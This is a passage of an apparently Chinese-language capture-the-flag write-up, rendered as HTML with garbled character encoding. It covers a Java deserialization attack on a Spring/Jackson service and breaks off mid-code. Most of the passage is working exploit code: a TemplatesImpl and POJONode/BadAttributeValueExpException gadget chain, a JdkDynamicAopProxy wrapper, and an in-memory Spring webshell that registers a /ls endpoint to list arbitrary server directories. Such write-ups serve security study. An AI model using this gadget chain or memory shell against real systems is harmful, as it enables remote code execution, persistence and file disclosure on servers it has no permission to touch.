class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">myProxy</span> <span class="operator">=</span> Proxy.newProxyInstance(TestProxy.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">MyHandler</span>());</span><br><span class="line">        <span class="keyword">for</span>(Method m: myProxy.getClass().getDeclaredMethods()) &#123;</span><br><span class="line">            System.out.println(m.getName());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">TestInterface1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">say</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">TestInterface2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TestProxy</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;eat something&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">say</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;say something&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">(String a)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;invoke dynamic proxy handler&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231106082615.png" alt="å¾®ä¿¡æˆªå›¾_20231106082615"></p><p>è¿™ä¸¤ä¸ªæ–¹æ³•æ˜¯<code>Templates</code>é‡Œé¢å®šä¹‰çš„æ¥å£æ–¹æ³•</p><p><code>JdkDynamicAopProxy</code> æ˜¯ Spring æ¡†æ¶ä¸­çš„ä¸€ä¸ªç±»ï¼Œå®ƒå®ç°äº† JDK åŠ¨æ€ä»£ç†æœºåˆ¶ï¼Œç”¨äºåˆ›å»ºä»£ç†å¯¹è±¡æ¥å®ç°é¢å‘åˆ‡é¢ç¼–ç¨‹ï¼ˆAOPï¼‰çš„åŠŸèƒ½ã€‚</p><p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231105215128.png" alt="å¾®ä¿¡æˆªå›¾_20231105215128"></p><p>è¿™é‡Œèƒ½å¤Ÿæ§åˆ¶advised</p><p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231105215235.png" alt="å¾®ä¿¡æˆªå›¾_20231105215235"></p><p>è¿™é‡Œä¼šè§¦å‘åå°„æ–¹æ³•,è¿™é‡Œ<code>advised</code>å‰é¢è¯´è¿‡äº†å¯æ§</p><p>æˆ‘ä»¬å°†æ‰€éœ€çš„ <code>TemplatesImpl</code> çš„å¯¹è±¡ç”¨ <code>org.springframework.aop.framework.AdvisedSupport</code> å°è£…å³å¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">oldProxy</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">setProxyContext</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="type">TargetSource</span> <span class="variable">targetSource</span> <span class="operator">=</span> <span class="built_in">this</span>.advised.targetSource;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">target</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br></pre></td></tr></table></figure><p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231105215851.png" alt="å¾®ä¿¡æˆªå›¾_20231105215851"></p><p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231105220106.png" alt="å¾®ä¿¡æˆªå›¾_20231105220106"></p><h3 id="æ„é€ "><span id="æ„é€ "> æ„é€ </span></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>);</span><br><span class="line">Constructor&lt;?&gt; cons = clazz.getDeclaredConstructor(AdvisedSupport.class);</span><br><span class="line">cons.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">AdvisedSupport</span> <span class="variable">advisedSupport</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AdvisedSupport</span>();</span><br><span class="line">advisedSupport.setTarget(templatesImpl);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) cons.newInstance(advisedSupport);</span><br><span class="line"><span class="type">Object</span> <span class="variable">proxyObj</span> <span class="operator">=</span> Proxy.newProxyInstance(clazz.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, handler);</span><br><span class="line"><span class="type">POJONode</span> <span class="variable">jsonNodes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(proxyObj);</span><br></pre></td></tr></table></figure><p>ğŸ‘´ã®æœ€å¾Œã®ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.BaseJsonNode;</span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line"><span class="comment">//        ClassPool classPool = ClassPool.getDefault();</span></span><br><span class="line"><span class="comment">//        CtClass ctClass = classPool.get(evilref.class.getName());</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//        CtClass superClass = classPool.get(AbstractTranslet.class.getName());</span></span><br><span class="line"><span class="comment">//        ctClass.setSuperclass(superClass);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        CtConstructor constructor = new CtConstructor(new CtClass[]&#123;&#125;,ctClass);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        constructor.setBody(&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        ctClass.addConstructor(constructor);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//byte[][] codes = new byte[][]&#123;code&#125;;</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        ref(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;&#125;);</span><br><span class="line">        ref(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;shanghe&quot;</span>);</span><br><span class="line">        ref(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">jsonNodes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(templates);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(exp,jsonNodes);</span><br><span class="line"></span><br><span class="line">        serialize_func.serialize(exp);</span><br><span class="line">        WriteToFileExample(serialize_func.encryptToBase64(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">WriteToFileExample</span><span class="params">(String args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> <span class="string">&quot;è¿™æ˜¯è¦å†™å…¥æ–‡ä»¶çš„å­—ç¬¦ä¸²å†…å®¹&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">BufferedWriter</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedWriter</span>(<span class="keyword">new</span> <span class="title class_">FileWriter</span>(<span class="string">&quot;output.txt&quot;</span>));</span><br><span class="line">            writer.write(args);</span><br><span class="line">            writer.close();</span><br><span class="line">            System.out.println(<span class="string">&quot;å­—ç¬¦ä¸²å·²æˆåŠŸå†™å…¥æ–‡ä»¶ã€‚&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;å†™å…¥æ–‡ä»¶æ—¶å‘ç”Ÿé”™è¯¯ï¼š&quot;</span> + e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">ref</span><span class="params">(Object obj,String field,Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">reffield</span> <span class="operator">=</span> obj.getClass().getDeclaredField(field);</span><br><span class="line">        reffield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        reffield.set(obj,value);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">serial</span><span class="params">(Object o)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException&#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line"></span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64String</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());</span><br><span class="line">        <span class="keyword">return</span> base64String;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserial</span><span class="params">(String data)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] base64decodedBytes = Base64.getDecoder().decode(data);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(base64decodedBytes);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="å†…å­˜çš„ä½¿ç”¨"><span id="å†…å­˜çš„ä½¿ç”¨"> å†…å­˜ğŸçš„ä½¿ç”¨ğŸ¥µğŸ‘´</span></h2><p>æéº»éº»æ»´,å¤ªå¤æ‚äº†,è¿˜è¦å†™ä¸ªå†…å­˜é©¬æ‰¾åˆ°RASP,è¿˜å¥½ğŸ‘´æŠ€é«˜ä¸€ç­¹.</p><h3 id="åˆ—ç›®å½•"><span id="åˆ—ç›®å½•"> åˆ—ç›®å½•</span></h3><p>nm,è·Ÿå–å¤§äº†ä¸€æ ·,æ•´è¿™bç©æ„,è‰¹ğŸ˜¡</p><p>é¦–å…ˆæ¥ä¸€ä¸ªé€’å½’åˆ—å‡ºæ‰€æœ‰ç›®å½•æ–‡ä»¶çš„</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.*;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exls</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">RequestMappingHandlerMapping</span> <span class="variable">mappingHandlerMapping</span> <span class="operator">=</span> context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">configField</span> <span class="operator">=</span> mappingHandlerMapping.getClass().getDeclaredField(<span class="string">&quot;config&quot;</span>);</span><br><span class="line">            configField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            RequestMappingInfo.<span class="type">BuilderConfiguration</span> <span class="variable">config</span> <span class="operator">=</span> (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);</span><br><span class="line">            <span class="type">Method</span> <span class="variable">readmethod</span> <span class="operator">=</span> exls.class.getMethod(<span class="string">&quot;ls&quot;</span>, HttpServletRequest.class,HttpServletResponse.class);</span><br><span class="line"></span><br><span class="line">            <span class="type">RequestMappingInfo</span> <span class="variable">info</span> <span class="operator">=</span> RequestMappingInfo.paths(<span class="string">&quot;/ls&quot;</span>).options(config).build();</span><br><span class="line">            <span class="type">exls</span> <span class="variable">readfile_inject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">exls</span>();</span><br><span class="line">            mappingHandlerMapping.registerMapping(info,readfile_inject,readmethod);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">ls</span><span class="params">(HttpServletRequest request,HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">rootDirectory</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;dir&quot;</span>); <span class="comment">// æ›¿æ¢ä¸ºä½ çš„æ ¹ç›®å½•è·¯å¾„</span></span><br><span class="line">            listFilesAndDirectories(<span class="keyword">new</span> <span class="title class_">File</span>(rootDirectory),response);</span><br><span class="line">            response.getWriter().flush();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">listFilesAndDirectories</span><span class="params">(File directory,HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            File[] files = directory.listFiles();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (files != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">for</span> (File file : files) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (file.isFile()) &#123;</span><br><span class="line">                        response.getWriter().write(<span class="string">&quot;File: &quot;</span> + file.getAbsolutePath());</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (file.isDirectory()) &#123;</span><br><span class="line">                        response.getWriter().write(<span class="string">&quot;Directory: &quot;</span> + file.getAbsolutePath());</span><br><span class="line">                        listFilesAndDirectories(file,response); <span class="comment">// é€’å½’éå†å­ç›®å½•</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™æ ·çš„ç¼ºç‚¹æ˜¯åˆ—å‡ºæ ¹ç›®å½•çš„æ—¶å€™å¤ªå¤šæ‚ç¢çš„ä¸œè¥¿,ğŸ‘´çœ‹ä¸åŠ¨,è¦ä¸æ˜¯ğŸ‘´çŸ¥é“/homeä¸‹é¢æœ‰ä¸œè¥¿,è¿™ç©æ„å¤ªéš¾æ‰¾äº†.</p><p>ä¼˜åŒ–ä¸€ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span 